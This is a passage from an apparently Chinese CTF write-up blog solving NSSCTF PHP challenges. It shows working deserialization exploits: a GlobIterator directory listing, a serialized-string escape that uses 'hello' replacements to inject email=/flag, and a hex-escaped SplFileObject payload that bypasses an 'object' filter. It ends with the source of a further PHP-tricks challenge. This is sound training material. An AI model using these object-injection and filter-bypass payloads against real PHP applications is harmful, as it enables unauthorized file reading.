<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>出口在<code>catalogue::__destruct</code>中的<code>echo new $this-&gt;class($this-&gt;data)</code>，很明显需要调用原生类</p>
<p>然后看一下下面对get传参的的过滤，过滤了<code>object</code></p>
<p>那我们先用<code>GlobIterator</code>类来寻找一下flag</p>
<p>exp：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">catalogue</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$class</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"GlobIterator"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/*f*"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">catalogue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以读到根目录下存在&#x2F;flag</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231021203800743.png" alt="image-20231021203800743"></p>
<p>接下来就是要想办法读取flag，上面ban了object，意味着能读取文件的原生类像<code>SplFileObject</code>这样的无法使用</p>
<p>所以要用到post传参的语句</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">escape</span><span class="token punctuation">&#123;</span>                                                                   
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'OTL'</span><span class="token punctuation">;</span>                                                 
    <span class="token keyword">public</span> <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'123666'</span><span class="token punctuation">;</span>                                             
    <span class="token keyword">public</span> <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'sweet@OTL.com'</span><span class="token punctuation">;</span>                          
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">abscond</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'NSS'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'CTF'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'OTL_QAQ'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono,you can not do that!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$abscond</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">escape</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$abscond</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$abscond</span><span class="token operator">-></span><span class="token property">phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$abscond</span><span class="token operator">-></span><span class="token property">email</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$abscond</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$abscond</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">abscond</span><span class="token punctuation">(</span><span class="token variable">$abscond</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"I'm sorry to tell you that you are wrong"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>很明显要利用最后的<code>file_get_contents</code>，让email&#x3D;&#x2F;flag</p>
<p>按照常规思路是要在phone变量构造使它多出来目标的email变量，但是这题的phone变量得是个数组</p>
<p>我们先本地测试一下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">escape</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0w0'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'NSS'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">abscond</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'NSS'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'CTF'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'OTL_QAQ'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$abscond</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">escape</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$abscond</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$abscond</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$abscond</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">abscond</span><span class="token punctuation">(</span><span class="token variable">$abscond</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"escape"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"0w0"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"NSS"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"escape"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"0w0"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>那我们的目标就是<code>&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</code>，共28个字符</p>
<p>用28个hello逃逸即可</p>
<p>exp：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">escape</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0w0'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'hellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohello";&#125;s:5:"email";s:5:"/flag";&#125;'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">abscond</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'NSS'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'CTF'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'OTL_QAQ'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$abscond</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">escape</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$abscond</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$abscond</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//echo $abscond;</span>
<span class="token comment">//echo "\n";</span>
<span class="token keyword">echo</span> <span class="token function">abscond</span><span class="token punctuation">(</span><span class="token variable">$abscond</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">abscond</span><span class="token punctuation">(</span><span class="token variable">$abscond</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231021210950863.png" alt="image-20231021210950863"></p>
<p>本地测试成功，那么传参即可</p>
<p>payload：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">GET：/?cata=
POST：name=0w0&amp;phone[]=hellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohello";&#125;s:5:"email";s:5:"/flag";&#125;&amp;email=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>base64解码即可获得flag</p>
<h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>我们可以用<code>SplFileObject</code>类来读文件，但是要对其中的object进行16进制编码，同时长度13前面的s要大写，这样就可以解析16进制了</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>cata<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"catalogue"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"class"</span><span class="token punctuation">;</span><span class="token constant">S</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"SplFileOb\6Aect"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="SWPUCTF-2022-新生赛-funny-php"><a href="#SWPUCTF-2022-新生赛-funny-php" class="headerlink" title="[SWPUCTF 2022 新生赛]funny_php"></a>[SWPUCTF 2022 新生赛]funny_php</h1><blockquote>
<p>php特性</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
   <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">3</span><span class="token operator">&amp;&amp;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
           <span class="token keyword">echo</span> <span class="token string double-quoted-string">":D"</span><span class="token punctuation">;</span>
            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'L1'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">":C"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/NSSCTF/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$str</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"NSSCTF"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"wow"</span><span class="token punctuation">;</span>
            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'L2'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Nice!"</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"yoxi!"</span><span class="token punctuation">;</span>
                    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'L3'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"X("</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"G"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'L1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'L2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'L3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
